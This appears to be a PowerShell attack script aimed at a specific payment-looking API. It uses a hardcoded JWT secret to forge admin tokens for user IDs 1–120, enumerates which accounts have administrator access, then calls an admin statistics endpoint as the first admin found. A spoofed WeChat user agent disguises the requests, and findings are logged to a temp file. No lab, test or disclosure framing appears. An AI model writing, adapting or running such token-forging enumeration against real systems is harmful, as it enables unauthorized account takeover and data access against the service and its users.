param([string]$OutFile = "$env:TEMP\admin_scan2.txt")

$ErrorActionPreference = 'Continue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$secret = 'a8f5f167f44f4964e6c998dee827110c3b2e3f9e8e6f5a4d3c2b1a0f9e8d7c6b5a4938271605f4e3d2c1b0a9f8e7d6c5b4a39281706f5e4d3c2b1a0'
$baseUrl = 'https://payun01.cn/api/v1'
$ua = 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.49'

function B64Url([byte[]]$bytes) {
  return [Convert]::ToBase64String($bytes).TrimEnd('=').Replace('+', '-').Replace('/', '_')
}

function New-Jwt([int]$uid, [string]$sec) {
  $header = '{"alg":"HS256","typ":"JWT"}'
  $iat = [int][double]::Parse((Get-Date -UFormat %s))
  $payload = '{"userId":' + $uid + ',"iat":' + $iat + ',"exp":' + ($iat + 604800) + '}'
  $h = B64Url ([Text.Encoding]::UTF8.GetBytes($header))
  $p = B64Url ([Text.Encoding]::UTF8.GetBytes($payload))
  $hmac = New-Object System.Security.Cryptography.HMACSHA256
  $hmac.Key = [Text.Encoding]::UTF8.GetBytes($sec)
  $sig = B64Url ($hmac.ComputeHash([Text.Encoding]::UTF8.GetBytes($h + '.' + $p)))
  $hmac.Dispose()
  return $h + '.' + $p + '.' + $sig
}

function Req([string]$url, [string]$token) {
  try {
    $r = Invoke-WebRequest -Uri $url -UseBasicParsing -TimeoutSec 20 -UserAgent $ua -Headers @{ Authorization = "Bearer $token" }
    return "HTTP=$($r.StatusCode) BODY=$($r.Content)"
  } catch {
    $code = ''
    $body = ''
    if ($_.Exception.Response) {
      $code = $_.Exception.Response.StatusCode.value__
      if ($_.ErrorDetails -and $_.ErrorDetails.Message) { $body = $_.ErrorDetails.Message }
    }
    if (-not $body) { $body = $_.Exception.Message }
    return "ERR HTTP=$code BODY=$body"
  }
}

$log = New-Object System.Collections.Generic.List[string]
$log.Add('=== admin scan2 ' + (Get-Date -Format s) + ' ===')

$admins = @()
for ($uid = 1; $uid -le 120; $uid++) {
  $token = New-Jwt $uid $secret
  $result = Req "$baseUrl/admin/me" $token
  if ($result -notmatch 'ERR') {
    $log.Add("uid=$uid $result")
    $admins += $uid
  } elseif ($result -match '权限') {
    $log.Add("uid=$uid exists-nonadmin ($result)")
  }
  Start-Sleep -Milliseconds 60
}

$log.Add('=== admins: ' + ($(if ($admins.Count) { $admins -join ',' } else { 'NONE' })) + ' ===')

if ($admins.Count) {
  $token = New-Jwt $admins[0] $secret
  $log.Add((Req "$baseUrl/admin/stats" $token))
}

$log.Add('=== end ===')
$log -join "`r`n" | Out-File -FilePath $OutFile -Encoding utf8
